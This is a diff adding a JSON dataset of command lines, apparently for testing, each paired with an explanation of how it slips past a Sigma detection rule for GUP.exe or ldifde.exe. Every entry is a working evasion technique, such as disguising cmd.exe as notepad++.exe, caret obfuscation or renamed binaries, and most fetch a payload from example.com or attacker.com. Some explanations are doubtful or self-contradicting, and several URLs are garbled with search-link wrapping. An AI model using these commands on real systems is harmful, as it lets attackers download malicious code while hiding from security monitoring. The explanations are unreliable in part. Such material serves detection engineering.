@@ -1,0 +1,34 @@
+[
+  {
+    "output": "cmd.exe /c copy C:\\Windows\\System32\\cmd.exe C:\\Temp\\notepad++.exe && C:\\Temp\\notepad++.exe /c \"C:\\Program Files\\Notepad++\\updater\\GUP.exe -unzipTo C:\\Temp [http://example.com/payload.zip](https://www.google.com/search?q=http://example.com/payload.zip)\"",
+    "explanation": "The rule uses a negation filter that explicitly checks if the ParentImage ends with '\\notepad++.exe'. By copying a legitimate shell like cmd.exe to a temporary directory, naming it notepad++.exe, and using it to spawn the GUP utility, the filter condition evaluates to true, causing the SIEM to discard the alert."
+  },
+  {
+    "output": "\"C:\\Program Files\\Notepad++\\updater\\GUP.exe\" -unzipTo=C:\\Temp [http://example.com/payload.zip](https://www.google.com/search?q=http://example.com/payload.zip)",
+    "explanation": "The 'selection_cli' condition relies on a strict text string match for ' -unzipTo ' with trailing and leading spaces. Substituting the trailing space with an equals sign ('-unzipTo=') to supply the destination argument breaks the static signature matching logic while allowing the parameter to parse successfully."
+  },
+  {
+    "output": "cmd.exe /c \"C:\\Program Files\\Notepad++\\updater\\GUP.exe -unzipTo C:\\Temp h^t^t^p://[example.com/payload.zip]()\"",
+    "explanation": "The Windows command shell interprets the caret symbol (^) as an escape character. When executed inside cmd.exe, the raw process creation logs will capture the literal string 'h^t^t^p', breaking the contiguous 'http' substring match constraint without affecting the network resolution capabilities of the binary."
+  },
+  {
+    "output": "ldifde.exe /i /f C:\\path\\to\\file.ldf",
+    "explanation": "The Sigma rule checks explicitly for the lowercase switches '-i' and '-f' using a case-sensitive or standard string containment check depending on the SIEM engine implementation. Windows CLI utilities generally accept forward slashes ('/') instead of dashes ('-'), and are case-insensitive. Using '/i /f' or uppercase equivalents like '-I -F' can bypass rules that strictly look for the literal strings '-i' and '-f'."
+  },
+  {
+    "output": "ldifde.exe -i -f [http://example.com/payload.ldf](https://www.google.com/search?q=http://example.com/payload.ldf)",
+    "explanation": "Alternatively, if the rule is interpreted purely as written, changing the order of the parameters or mixing case (e.g., -I -F) avoids matching the specific lowercase substrings defined in the selection_cli list."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\ldifde.exe %TEMP%\\not_suspicious.exe && %TEMP%\\not_suspicious.exe /i /f http://attacker.com/payload.ldf",
+    "explanation": "The rule relies on the 'Image' ending in '\\ldifde.exe' or the 'OriginalFileName' being 'ldifde.exe'. By copying the binary to a new name, the 'Image' check is bypassed. If the EDR/SIEM does not reliably populate 'OriginalFileName' from the PE header, the rule will fail to trigger."
+  },
+  {
+    "output": "ldifde.exe /i /f http://attacker.com/payload.ldf",
+    "explanation": "The rule explicitly looks for the hyphen prefix ('-i' and '-f'). In Windows command-line processing, many utilities\u2014including ldifde.exe\u2014accept forward slashes ('/') as parameter delimiters. Using '/i' and '/f' avoids the 'selection_cli' string match."
+  },
+  {
+    "output": "ldifde.exe -i -f \"http://attacker.com/payload.ldf\" -u",
+    "explanation": "While this specific command might still trigger this specific rule (which uses 'contains|all'), many logic-based rules are bypassed by adding unnecessary flags or changing the order of arguments if the detection logic is too rigid (e.g., looking for a specific sequence)."
+  }
+]
